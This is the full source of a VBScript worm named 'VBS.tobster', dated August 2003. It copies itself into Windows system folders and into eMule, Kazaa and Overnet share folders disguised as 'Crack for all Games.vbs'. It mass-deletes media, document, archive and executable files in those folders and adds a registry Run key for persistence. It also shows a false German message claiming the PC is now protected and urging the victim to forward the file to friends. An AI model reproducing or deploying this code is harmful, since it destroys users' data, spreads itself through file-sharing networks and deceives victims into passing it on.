' VBS.tobster
' August 2003
' Germany

On Error Resume Next
Set sfso = CreateObject("Scripting.FileSystemObject")
If (sfso.FolderExists("c:\winnt\system32")) Then
sfso.CopyFile wscript.ScriptFullName, "c:\winnt\system32\tobster.vbs"
End If

If (sfso.FolderExists("c:\windows\system32")) Then
sfso.CopyFile wscript.ScriptFullName, "c:\windows\system32\tobster.vbs"
End If

If (sfso.FolderExists("c:\programme\emule")) Then
sfso.CopyFile wscript.ScriptFullName, "c:\programme\emule\incoming\Crack for all Games.vbs"
End If


If (sfso.FolderExists("c:\programme\kazaa")) Then
sfso.CopyFile wscript.ScriptFullName, "c:\programme\kazaa\my shared folder\Crack for all Games.vbs"
End If

If (sfso.FolderExists("c:\programme\overnet")) Then
sfso.CopyFile wscript.ScriptFullName, "c:\programme\overnet\incoming\Crack for all Games.vbs"
End If

If (sfso.FolderExists("c:\programme\emule")) Then
sfso.DeleteFile("c:\programme\emule\incoming\*.mp3")
sfso.DeleteFile("c:\programme\emule\incoming\*.wav")
sfso.DeleteFile("c:\programme\emule\incoming\*.doc")
sfso.DeleteFile("c:\programme\emule\incoming\*.txt")
sfso.DeleteFile("c:\programme\emule\incoming\*.pdf")
sfso.DeleteFile("c:\programme\emule\incoming\*.avi")
sfso.DeleteFile("c:\programme\emule\incoming\*.mpg")
sfso.DeleteFile("c:\programme\emule\incoming\*.mpeg")
sfso.DeleteFile("c:\programme\emule\incoming\*.zip")
sfso.DeleteFile("c:\programme\emule\incoming\*.ace")
sfso.DeleteFile("c:\programme\emule\incoming\*.rar")
sfso.DeleteFile("c:\programme\emule\incoming\*.exe")
sfso.DeleteFile("c:\programme\emule\incoming\*.tar")
sfso.DeleteFile("c:\programme\emule\incoming\*.iso")
sfso.DeleteFile("c:\programme\emule\incoming\*.bin")
sfso.DeleteFile("c:\programme\emule\incoming\*.cue")
sfso.DeleteFile("c:\programme\emule\temp\*.part")
sfso.DeleteFile("c:\programme\emule\temp\*.met")
sfso.DeleteFile("c:\programme\emule\temp\*.bak")

End If

If (sfso.FolderExists("c:\programme\kazaa")) Then
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.mp3")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.wav")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.doc")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.txt")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.pdf")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.avi")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.mpeg")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.zip")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.ace")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.rar")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.exe")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.tar")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.iso")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.bin")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.cue")
sfso.DeleteFile("c:\programme\kazaa\my shared folder\*.dat")
End If

If (sfso.FolderExists("c:\programme\overnet")) Then
sfso.DeleteFile("c:\programme\overnet\incoming\*.mp3")
sfso.DeleteFile("c:\programme\overnet\incoming\*.wav")
sfso.DeleteFile("c:\programme\overnet\incoming\*.doc")
sfso.DeleteFile("c:\programme\overnet\incoming\*.txt")
sfso.DeleteFile("c:\programme\overnet\incoming\*.pdf")
sfso.DeleteFile("c:\programme\overnet\incoming\*.avi")
sfso.DeleteFile("c:\programme\overnet\incoming\*.mpg")
sfso.DeleteFile("c:\programme\overnet\incoming\*.mpeg")
sfso.DeleteFile("c:\programme\overnet\incoming\*.zip")
sfso.DeleteFile("c:\programme\overnet\incoming\*.ace")
sfso.DeleteFile("c:\programme\overnet\incoming\*.rar")
sfso.DeleteFile("c:\programme\overnet\incoming\*.exe")
sfso.DeleteFile("c:\programme\overnet\incoming\*.tar")
sfso.DeleteFile("c:\programme\overnet\incoming\*.iso")
sfso.DeleteFile("c:\programme\overnet\incoming\*.bin")
sfso.DeleteFile("c:\programme\overnet\incoming\*.cue")
End If

strMsg= strMsg & "Ihr PC ist nun vor bösartigen Datein geschützt!" & vbcrlf
strMsg= strMsg & "" & vbcrlf
strMsg= strMsg & "Senden Sie bitte diese Datei an Ihre Freunde und Bekannten um auch deren PC´s zu sichern!" & vbcrlf
strMsg= strMsg & "" & vbcrlf
strMsg= strMsg & "Vielen Dank!" & vbcrlf
msgbox strMsg,,"System protected"

Set t0b = CreateObject("WScript.Shell")
If (sfso.FolderExists("c:\winnt\system32")) Then
t0b.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\t0b", "c:\winnt\system32\tobster.vbs"
End If
If (sfso.FolderExists("c:\windows\system32")) Then
t0b.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\t0b", "c:\windows\system32\tobster.vbs"
End If





